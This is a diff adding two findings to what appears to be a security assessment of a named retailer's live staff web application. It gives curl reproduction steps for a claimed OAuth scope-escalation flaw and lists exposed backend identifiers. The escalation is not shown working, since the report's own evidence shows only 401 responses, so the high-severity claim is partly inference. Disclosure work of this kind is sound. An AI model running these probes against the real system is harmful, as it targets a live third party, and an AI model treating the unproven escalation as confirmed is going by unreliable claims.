@@ -286,6 +286,150 @@ Additional providers tested:
 
 ---
 
+## Finding #8: Client-Controlled Authorization Scope in OAuth Flow (Privilege Escalation)
+**Severity**: High (Privilege Escalation)
+**Domain**: techsale.theperfumeshop.com
+
+### Description
+The TPS Tech Sale application (Next.js + Supabase on Azure App Service) implements a custom OAuth flow via `/api/auth/oauth` that accepts a client-controlled `scope` parameter determining the user's authorization level. The application has at least two scope levels: `COLLEAGUE` (regular employee) and `ADMIN` (administrator). The server-side endpoint accepts **any scope value** without validation, returning a valid OAuth authorization URL with the attacker-controlled scope embedded in the callback URL.
+
+After Microsoft OAuth completes, the callback at `/api/auth/callback?scope=ADMIN` receives the scope parameter and may use it to assign the user's role in the application. Since the scope originates from an unauthenticated client-side POST request, an attacker can escalate from `COLLEAGUE` to `ADMIN` simply by modifying the scope parameter.
+
+### Steps to Reproduce
+1. Send a POST request to the OAuth endpoint requesting admin scope:
+   ```bash
+   curl -X POST https://techsale.theperfumeshop.com/api/auth/oauth \
+     -H 'Content-Type: application/json' \
+     -d '{"scope":"ADMIN"}'
+   ```
+2. The server responds with a valid Supabase OAuth URL:
+   ```json
+   {
+     "success": true,
+     "url": "https://xrcihilprzuextoudevs.supabase.co/auth/v1/authorize?provider=azure&redirect_to=https://techsale.theperfumeshop.com/api/auth/callback?scope=ADMIN&scopes=openid profile email User.Read&code_challenge=..."
+   }
+   ```
+3. Notice the callback URL contains `scope=ADMIN` — this value came directly from the client
+4. A legitimate colleague would normally use `scope=COLLEAGUE`, but the server does not validate the scope value
+5. The same Azure OAuth provider and scopes (`openid profile email User.Read`) are used regardless of the requested application scope
+
+### Evidence
+```
+Normal colleague flow:
+  POST /api/auth/oauth {"scope":"COLLEAGUE"}
+  -> redirect_to=.../api/auth/callback?scope=COLLEAGUE
+
+Escalated admin flow:
+  POST /api/auth/oauth {"scope":"ADMIN"}
+  -> redirect_to=.../api/auth/callback?scope=ADMIN
+
+Both use identical Azure OAuth:
+  Provider: azure (Microsoft Entra ID via Supabase)
+  Supabase Project: xrcihilprzuextoudevs
+  Scopes: openid profile email User.Read
+  Code challenge method: S256 (PKCE)
+
+Session info: {"success":true,"data":null,"mode":"supabase"}
+
+Cookie set: colleague-sb-xrcihilprzuextoudevs-auth-token-code-verifier
+  (Supabase PKCE code verifier, 400-day expiry)
+
+Protected API endpoints discovered:
+  /api/products  - 401 (product catalog)
+  /api/items     - 401 (inventory items)
+  /api/admin     - 401 (admin panel)
+  /api/users     - 401 (user management)
+  /api/orders    - 401 (order management)
+  /api/catalogue - 401 (full catalogue)
+  /api/config    - 401 (application config)
+  /api/settings  - 401 (app settings)
+```
+
+### Impact
+- **High**: A regular TPS employee (`COLLEAGUE` scope) can escalate to `ADMIN` scope, potentially gaining access to user management, order management, and application configuration
+- **High**: An external attacker who compromises any Microsoft work account could directly request admin-level access
+- **Medium**: The `/api/admin`, `/api/users`, `/api/orders`, and `/api/config` endpoints suggest significant admin functionality that would be accessible after scope escalation
+- **Medium**: The Supabase PKCE code verifier cookie has a 400-day expiry (`Max-Age=34560000`), meaning a stolen session persists for over a year
+
+### CVSS 4.0
+**7.5** (High) - CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N
+
+### Recommendation
+1. **Immediate**: Validate the `scope` parameter server-side against a whitelist of allowed values; reject any request with an unrecognized scope
+2. **Immediate**: Do not pass the authorization scope as a client-controlled callback parameter; determine the user's role server-side based on their identity after OAuth completes (e.g., by querying a roles table in Supabase)
+3. **Short-term**: Implement server-side role assignment based on Azure AD group membership or email domain, not client-supplied parameters
+4. **Short-term**: Reduce the PKCE code verifier cookie expiry from 400 days to a reasonable session duration (e.g., 8 hours)
+
+---
+
+## Finding #9: Supabase Project Infrastructure Exposure with Enumerable API Surface
+**Severity**: Medium (Information Disclosure / Attack Surface Expansion)
+**Domain**: techsale.theperfumeshop.com
+
+### Description
+The TPS Tech Sale application's Supabase backend infrastructure is fully enumerable from the client-side code and HTTP response headers. The Supabase project ID (`xrcihilprzuextoudevs`), authentication cookie names, Content-Security-Policy directives, and PKCE flow details are all exposed, providing a complete blueprint for attacking the backend.
+
+Additionally, the Content-Security-Policy header reveals all allowed image source domains, WebSocket connections, and API endpoints, mapping out the application's full dependency chain.
+
+### Steps to Reproduce
+1. Visit `https://techsale.theperfumeshop.com/` and inspect the HTTP response headers
+2. The `Content-Security-Policy` header reveals:
+   ```
+   connect-src 'self' https://xrcihilprzuextoudevs.supabase.co wss://xrcihilprzuextoudevs.supabase.co https://login.microsoftonline.com
+   ```
+3. The `Set-Cookie` header reveals the Supabase project ref in cookie names:
+   ```
+   colleague-sb-xrcihilprzuextoudevs-auth-token-code-verifier=base64-...
+   ```
+4. The Supabase instance responds to unauthenticated requests revealing its configuration:
+   ```bash
+   curl -D- https://xrcihilprzuextoudevs.supabase.co/auth/v1/settings
+   # Returns: sb-error-code: UNAUTHORIZED_MISSING_API_KEY
+   # Confirms: sb-project-ref: xrcihilprzuextoudevs, sb-gateway-version: 1
+   ```
+5. The CSP `img-src` reveals integration with external product image sources including Walmart, eBay, CloudFront, and others, suggesting a product aggregation feature
+
+### Evidence
+```
+Supabase Project: xrcihilprzuextoudevs
+Supabase URL: https://xrcihilprzuextoudevs.supabase.co
+WebSocket: wss://xrcihilprzuextoudevs.supabase.co
+Auth Provider: Azure (Microsoft Entra ID) via Supabase GoTrue
+PKCE: S256 code challenge method
+Cookie prefix: colleague-sb-xrcihilprzuextoudevs-auth-token-
+
+CSP img-src allowlist (external product image sources):
+  - https://media.theperfumeshop.com
+  - https://i5.walmartimages.com
+  - https://d2q01ftr6ua4w.cloudfront.net
+  - https://i.ebayimg.com
+  - https://techmarket.co.uk
+  - https://image-pim.mapemall.com
+  - https://multimedia.bbycastatic.ca
+  - https://i-system.gr
+  - https://img-prd-pim.poorvika.com
+  - https://images2.kabum.com.br
+
+Hosting: Azure App Service (ARRAffinity cookies)
+Framework: Next.js with Turbopack (server-rendered React)
+```
+
+### Impact
+- **Medium**: Complete backend infrastructure mapping enables targeted attacks against the Supabase instance
+- **Medium**: The CSP image allowlist reveals business partnerships and product sourcing, which is commercially sensitive
+- **Low**: Supabase response headers confirm the project ref and gateway version, aiding targeted attacks
+- **Low**: ARRAffinity cookies reveal Azure App Service sticky session configuration
+
+### CVSS 4.0
+**5.3** (Medium) - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N
+
+### Recommendation
+1. **Immediate**: Suppress Supabase project identifiers from cookie names; use generic names like `auth-code-verifier`
+2. **Short-term**: Restrict CSP `img-src` to only domains actually used; the broad allowlist suggests copy-paste configuration
+3. **Short-term**: Consider proxying Supabase requests through the application backend to hide the direct Supabase URL from clients
+
+---
+
 ## Additional Observations
 
 ### Akamai WAF (AkamaiGHost)
